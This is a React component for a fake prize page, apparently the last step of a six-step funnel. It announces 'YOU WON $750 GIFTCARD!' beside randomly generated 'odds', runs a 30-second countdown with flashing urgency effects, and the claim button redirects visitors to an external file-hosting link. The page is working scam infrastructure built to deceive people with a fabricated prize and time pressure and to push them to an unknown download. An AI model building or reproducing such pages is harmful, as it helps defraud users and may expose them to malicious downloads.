"use client"

import { useState, useEffect } from "react"
import { motion, AnimatePresence } from "framer-motion"
import { Gift, AlertTriangle } from "lucide-react"
import ProgressBar from "./progress-bar"
import { useLocalization } from "./localization-provider"

interface GiftCardClaimPageProps {
  prizeAmount: number
  username: string
}

export default function GiftCardClaimPage({ prizeAmount, username }: GiftCardClaimPageProps) {
  const { t } = useLocalization()
  const [timeLeft, setTimeLeft] = useState(30)
  const [isExpired, setIsExpired] = useState(false)

  useEffect(() => {
    if (timeLeft <= 0) {
      setIsExpired(true)
      return
    }

    const timer = setInterval(() => {
      setTimeLeft((prevTime) => prevTime - 1)
    }, 1000)

    return () => clearInterval(timer)
  }, [timeLeft])

  const handleClaimPrize = () => {
    if (isExpired) {
      alert(t.timesUp)
      return
    }
    window.location.href = "https://quartzfiles.com/1815055"
  }

  const getTimerColor = () => {
    return timeLeft > 27 ? "from-green-500 to-green-600" : "from-red-500 to-red-700"
  }

  const getTimerBorderColor = () => {
    return timeLeft > 27 ? "border-green-600" : "border-red-600"
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-400 via-blue-500 to-blue-600 flex flex-col items-center justify-start pt-0 p-4 pb-24 relative overflow-hidden">
      {/* Enhanced background effects */}
      <div className="absolute inset-0 overflow-hidden">
        {[...Array(12)].map((_, i) => (
          <motion.div
            key={i}
            className="absolute opacity-10"
            animate={{
              x: [Math.random() * window.innerWidth, Math.random() * window.innerWidth],
              y: [Math.random() * window.innerHeight, Math.random() * window.innerHeight],
              rotate: [0, 360],
              scale: [0.3, 2, 0.3],
            }}
            transition={{
              duration: 15 + Math.random() * 10,
              repeat: Number.POSITIVE_INFINITY,
              delay: i * 0.5,
            }}
          >
            <Gift className="text-yellow-300" size={25 + Math.random() * 20} />
          </motion.div>
        ))}

        {/* Money symbols floating */}
        {["$", "€", "£", "¥"].map((symbol, i) => (
          <motion.div
            key={symbol}
            className="absolute text-green-300/20 text-6xl font-bold"
            style={{
              left: `${20 + i * 20}%`,
              top: `${20 + Math.random() * 60}%`,
            }}
            animate={{
              y: [0, -30, 0],
              rotate: [0, 15, -15, 0],
              scale: [0.8, 1.2, 0.8],
            }}
            transition={{
              duration: 4 + Math.random() * 2,
              repeat: Number.POSITIVE_INFINITY,
              delay: i * 0.5,
            }}
          >
            {symbol}
          </motion.div>
        ))}
      </div>

      <motion.div initial={{ opacity: 0, y: -20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.8 }}>
        <ProgressBar currentStep={6} totalSteps={6} />
      </motion.div>

      <div className="flex flex-col items-center flex-1 w-full max-w-md mt-0 z-10">
        <motion.div
          initial={{ opacity: 0, y: 50 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, type: "spring", stiffness: 100 }}
          className="text-center w-full"
        >
          <motion.div
            className="trust-card py-8 px-6 mb-8 flex flex-col items-center gap-y-6 relative overflow-hidden"
            animate={{
              scale: [1, 1.01, 1],
              boxShadow: [
                "0 20px 40px rgba(0,0,0,0.2)",
                "0 25px 50px rgba(34,197,94,0.4)",
                "0 20px 40px rgba(0,0,0,0.2)",
              ],
            }}
            transition={{ duration: 2.5, repeat: Number.POSITIVE_INFINITY }}
          >
            {/* Card shine effect */}
            <motion.div
              className="absolute inset-0 bg-gradient-to-r from-transparent via-green-200 to-transparent opacity-10"
              animate={{
                x: ["-100%", "100%"],
              }}
              transition={{
                duration: 3,
                repeat: Number.POSITIVE_INFINITY,
                repeatDelay: 2,
              }}
            />

            {/* Enhanced prize display */}
            <motion.div
              className="bg-gradient-to-br from-green-100 to-green-200 border-4 border-green-400 rounded-xl p-6 w-full relative overflow-hidden"
              animate={{
                boxShadow: [
                  "0 0 20px rgba(34,197,94,0.3)",
                  "0 0 30px rgba(34,197,94,0.6)",
                  "0 0 20px rgba(34,197,94,0.3)",
                ],
              }}
              transition={{ duration: 2, repeat: Number.POSITIVE_INFINITY }}
            >
              {/* Prize shine */}
              <motion.div
                className="absolute inset-0 bg-gradient-to-r from-transparent via-white to-transparent opacity-30"
                animate={{
                  x: ["-100%", "100%"],
                }}
                transition={{
                  duration: 2,
                  repeat: Number.POSITIVE_INFINITY,
                  repeatDelay: 1,
                }}
              />

              <motion.p
                className="text-5xl font-black text-green-800 leading-none relative z-10"
                animate={{
                  scale: [1, 1.05, 1],
                }}
                transition={{ duration: 1.5, repeat: Number.POSITIVE_INFINITY }}
              >
                YOU WON $750 GIFTCARD!
              </motion.p>
            </motion.div>

            {/* Enhanced odds display */}
            <motion.p
              className="text-blue-500 font-bold text-lg flex items-center gap-2"
              animate={{
                opacity: [0.7, 1, 0.7],
              }}
              transition={{ duration: 2, repeat: Number.POSITIVE_INFINITY }}
            >
              <motion.span
                animate={{ rotate: 360 }}
                transition={{ duration: 4, repeat: Number.POSITIVE_INFINITY, ease: "linear" }}
              >
                🌟
              </motion.span>
              {t.odds} 1/{Math.floor(Math.random() * 900000) + 100000}
              <motion.span
                animate={{ rotate: -360 }}
                transition={{ duration: 4, repeat: Number.POSITIVE_INFINITY, ease: "linear" }}
              >
                🌟
              </motion.span>
            </motion.p>

            {/* Enhanced countdown timer */}
            <motion.div
              onClick={handleClaimPrize} // Added onClick handler here
              className={`bg-gradient-to-r ${getTimerColor()} text-white font-black text-3xl py-4 px-6 rounded-xl w-full border-4 ${getTimerBorderColor()} relative overflow-hidden ${
                isExpired ? "opacity-50 grayscale" : ""
              } cursor-pointer`} // Added cursor-pointer
              animate={{
                scale: [1, 1.05, 1], // Keep the scale animation for emphasis
                boxShadow: [
                  "0 0 20px rgba(239,68,68,0.5)",
                  "0 0 40px rgba(239,68,68,0.8)",
                  "0 0 20px rgba(239,68,68,0.5)",
                ],
              }}
              transition={{
                duration: 0.5, // Keep a consistent duration for the pulse
                repeat: Number.POSITIVE_INFINITY,
              }}
            >
              {/* Timer shine */}
              <motion.div
                className="absolute inset-0 bg-gradient-to-r from-transparent via-white to-transparent opacity-20"
                animate={{
                  x: ["-100%", "100%"],
                }}
                transition={{
                  duration: 1.5,
                  repeat: Number.POSITIVE_INFINITY,
                  repeatDelay: 0.5,
                }}
              />
              <div className="flex items-center justify-center gap-3 relative z-10">
                <motion.div
                  animate={{
                    rotate: 360,
                    scale: [1, 1.3, 1],
                  }}
                  transition={{
                    rotate: { duration: 2, repeat: Number.POSITIVE_INFINITY, ease: "linear" },
                    scale: { duration: 1, repeat: Number.POSITIVE_INFINITY },
                  }}
                >
                  <AlertTriangle className="w-8 h-8" />
                </motion.div>
                <span>
                  {t.claimIn} {timeLeft}s!
                </span>
                <motion.span
                  animate={{
                    scale: [1, 1.5, 1],
                    rotate: [0, 15, -15, 0],
                  }}
                  transition={{ duration: 1, repeat: Number.POSITIVE_INFINITY }}
                >
                  ⏳
                </motion.span>
              </div>
            </motion.div>

            {/* Enhanced claim button */}
            <motion.button
              onClick={handleClaimPrize}
              disabled={isExpired}
              className={`trust-button w-full relative overflow-hidden transition-all duration-300 ${
                isExpired
                  ? "bg-gray-300 text-gray-500 border-gray-400 cursor-not-allowed"
                  : "bg-red-600 text-white border-red-700"
              }`}
              whileTap={{ scale: isExpired ? 1 : 0.95 }}
              animate={
                !isExpired
                  ? {
                      boxShadow: [
                        "0 4px 15px rgba(239,68,68,0.3)",
                        "0 12px 35px rgba(239,68,68,0.6)",
                        "0 4px 15px rgba(239,68,68,0.3)",
                      ],
                    }
                  : {}
              }
              transition={{
                boxShadow: { duration: 2, repeat: !isExpired ? Number.POSITIVE_INFINITY : 0 },
              }}
            >
              {/* Button shine effect */}
              {!isExpired && (
                <motion.div
                  className="absolute inset-0 bg-gradient-to-r from-transparent via-white to-transparent opacity-20"
                  animate={{
                    x: ["-100%", "100%"],
                  }}
                  transition={{
                    duration: 2,
                    repeat: Number.POSITIVE_INFINITY,
                    repeatDelay: 1,
                  }}
                />
              )}
              <div className="relative z-10 flex items-center justify-center gap-2">
                {!isExpired && (
                  <motion.div
                    animate={{ rotate: 360 }}
                    transition={{ duration: 2, repeat: Number.POSITIVE_INFINITY, ease: "linear" }}
                  >
                    <Gift className="w-6 h-6" />
                  </motion.div>
                )}
                <span className="font-black text-xl">{t.claimPrize}</span>
                {!isExpired && (
                  <motion.span
                    animate={{
                      scale: [1, 1.3, 1],
                      rotate: [0, 10, -10, 0],
                    }}
                    transition={{ duration: 1.5, repeat: Number.POSITIVE_INFINITY }}
                  >
                    🚀
                  </motion.span>
                )}
              </div>
            </motion.button>

            {/* Personalized message */}
            <motion.p
              className="text-blue-600 font-bold text-sm mt-2"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ delay: 1 }}
            >
              Congratulations, {username}!
            </motion.p>
          </motion.div>
        </motion.div>
      </div>

      {/* Floating success particles */}
      <AnimatePresence>
        {!isExpired && (
          <>
            {[...Array(15)].map((_, i) => (
              <motion.div
                key={i}
                className="fixed w-3 h-3 rounded-full pointer-events-none"
                style={{
                  backgroundColor: ["#FFD700", "#FF6B6B", "#4ECDC4", "#45B7D1", "#96CEB4"][i % 5],
                  left: `${Math.random() * 100}%`,
                  top: `${Math.random() * 100}%`,
                }}
                animate={{
                  y: [0, -100, -200],
                  x: [(Math.random() - 0.5) * 100, (Math.random() - 0.5) * 200],
                  opacity: [1, 0.5, 0],
                  scale: [0, 1, 0],
                  rotate: [0, 360],
                }}
                transition={{
                  duration: 3 + Math.random() * 2,
                  repeat: Number.POSITIVE_INFINITY,
                  delay: Math.random() * 2,
                }}
              />
            ))}
          </>
        )}
      </AnimatePresence>
    </div>
  )
}
